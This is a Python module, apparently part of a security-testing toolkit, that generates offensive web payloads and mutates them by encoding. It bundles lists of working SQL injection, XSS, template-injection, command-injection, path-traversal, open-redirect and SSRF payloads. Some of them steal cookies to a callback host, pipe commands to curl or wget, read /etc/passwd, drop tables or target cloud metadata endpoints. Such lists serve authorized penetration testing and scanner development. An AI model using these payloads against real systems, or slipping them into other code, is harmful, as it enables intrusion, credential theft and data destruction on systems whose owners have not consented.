"""
tools/specialized/payload_generator.py — Offensive payload generation.

Generates context-aware payloads for SQLi, XSS, SSTI, CMDi from
built-in wordlists (subset of SecLists).  Supports custom wordlist
loading and payload mutation.
"""
from __future__ import annotations

import logging
import random
import string
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class PayloadCategory(str, Enum):
    SQLI = "sqli"
    XSS = "xss"
    SSTI = "ssti"
    CMDI = "cmdi"
    PATH_TRAVERSAL = "path_traversal"
    OPEN_REDIRECT = "open_redirect"
    SSRF = "ssrf"


@dataclass
class Payload:
    value: str
    category: PayloadCategory
    context: str = ""          # e.g. "error-based", "reflected", …
    encoding: str = "raw"      # raw, url, html, base64
    metadata: Dict[str, Any] = field(default_factory=dict)


# =========================================================================
# Built-in wordlists — curated subsets inspired by SecLists
# =========================================================================

_SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1\"",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1; DROP TABLE users--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "') OR ('1'='1",
    "admin'--",
    "1' WAITFOR DELAY '0:0:5'--",
    "' OR 1=1 LIMIT 1--",
    "1' AND '1'='1",
    "' OR ''='",
    "1 OR 1=1",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "';EXEC xp_cmdshell('whoami')--",
]

_XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id=\"</textarea><img/src/onerror=alert(1)>\">",
    "<%- alert(1) %>",
    "<script>fetch('https://OAST_PLACEHOLDER/'+document.cookie)</script>",
    "<input autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<ScRiPt>alert(1)</sCrIpT>",
]

_SSTI_PAYLOADS: List[str] = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.items()}}",
    "{{self.__init__.__globals__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{% import os %}{{os.popen('id').read()}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{''.class.mro()[1].subclasses()}}",
    "{{url_for.__globals__}}",
]

_CMDI_PAYLOADS: List[str] = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; ping -c 3 OAST_PLACEHOLDER",
    "| curl OAST_PLACEHOLDER",
    "& nslookup OAST_PLACEHOLDER",
    "; wget OAST_PLACEHOLDER",
    "\n id",
    "\r\n id",
    "';id;'",
    "\";id;\"",
    "a]};id;#",
    "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].os.popen('id').read()}}",
]

_PATH_TRAVERSAL_PAYLOADS: List[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00.jpg",
    "..%c0%afrip/../etc/passwd",
]

_OPEN_REDIRECT_PAYLOADS: List[str] = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "/%09/evil.com",
    "https://evil.com%00.example.com",
    "javascript:alert(1)//",
    "https:evil.com",
]

_SSRF_PAYLOADS: List[str] = [
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://localhost",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://0x7f000001",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a",
    "dict://127.0.0.1:6379/info",
]

_WORDLISTS: Dict[PayloadCategory, List[str]] = {
    PayloadCategory.SQLI: _SQLI_PAYLOADS,
    PayloadCategory.XSS: _XSS_PAYLOADS,
    PayloadCategory.SSTI: _SSTI_PAYLOADS,
    PayloadCategory.CMDI: _CMDI_PAYLOADS,
    PayloadCategory.PATH_TRAVERSAL: _PATH_TRAVERSAL_PAYLOADS,
    PayloadCategory.OPEN_REDIRECT: _OPEN_REDIRECT_PAYLOADS,
    PayloadCategory.SSRF: _SSRF_PAYLOADS,
}


class PayloadGenerator:
    """
    Security payload generator with bundled wordlists.

    * ``get()``            — return payloads for a given category
    * ``get_all()``        — return payloads for all categories
    * ``mutate()``         — apply encoding/evasion mutations
    * ``load_custom()``    — import an external wordlist file
    * ``with_oast()``      — inject OAST callback URL
    """

    def __init__(self) -> None:
        self._custom: Dict[PayloadCategory, List[str]] = {}

    # ------------------------------------------------------------------
    # Retrieval
    # ------------------------------------------------------------------

    def get(
        self,
        category: PayloadCategory,
        limit: Optional[int] = None,
        shuffle: bool = False,
    ) -> List[Payload]:
        """Return payloads for *category*."""
        raw = list(_WORDLISTS.get(category, []))
        raw.extend(self._custom.get(category, []))
        if shuffle:
            random.shuffle(raw)
        if limit:
            raw = raw[:limit]
        return [Payload(value=p, category=category) for p in raw]

    def get_all(self, limit_per_category: int = 10) -> List[Payload]:
        """Return a sample of payloads from every category."""
        out: List[Payload] = []
        for cat in PayloadCategory:
            out.extend(self.get(cat, limit=limit_per_category))
        return out

    # ------------------------------------------------------------------
    # Mutation / encoding
    # ------------------------------------------------------------------

    def mutate(
        self,
        payload: Payload,
        encodings: Optional[List[str]] = None,
    ) -> List[Payload]:
        """
        Apply encoding transformations to *payload*.

        Supported: ``url``, ``double_url``, ``html``, ``base64``, ``unicode``.
        """
        import base64
        from urllib.parse import quote

        encodings = encodings or ["url", "double_url", "html", "base64"]
        variants: List[Payload] = []

        for enc in encodings:
            val = payload.value
            if enc == "url":
                val = quote(val)
            elif enc == "double_url":
                val = quote(quote(val))
            elif enc == "html":
                val = val.replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;")
                # Also provide raw-entity variant
                val_entities = "".join(f"&#{ord(c)};" for c in payload.value)
                variants.append(
                    Payload(value=val_entities, category=payload.category, encoding="html_entities")
                )
            elif enc == "base64":
                val = base64.b64encode(val.encode()).decode()
            elif enc == "unicode":
                val = "".join(f"\\u{ord(c):04x}" for c in payload.value)
            else:
                continue

            variants.append(
                Payload(value=val, category=payload.category, encoding=enc)
            )

        return variants

    # ------------------------------------------------------------------
    # OAST injection
    # ------------------------------------------------------------------

    def with_oast(self, payloads: List[Payload], oast_url: str) -> List[Payload]:
        """Replace ``OAST_PLACEHOLDER`` in payloads with the real OAST URL."""
        out: List[Payload] = []
        for p in payloads:
            new_val = p.value.replace("OAST_PLACEHOLDER", oast_url)
            out.append(
                Payload(
                    value=new_val,
                    category=p.category,
                    context=p.context,
                    encoding=p.encoding,
                    metadata={**p.metadata, "oast_url": oast_url},
                )
            )
        return out

    # ------------------------------------------------------------------
    # Custom wordlists
    # ------------------------------------------------------------------

    def load_custom(self, category: PayloadCategory, path: str) -> int:
        """Load a custom wordlist file (one payload per line). Returns count."""
        p = Path(path)
        if not p.exists():
            raise FileNotFoundError(f"Wordlist not found: {path}")

        lines = [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]
        if category not in self._custom:
            self._custom[category] = []
        self._custom[category].extend(lines)
        logger.info("payload_gen.loaded_custom", extra={"path": path, "count": len(lines)})
        return len(lines)
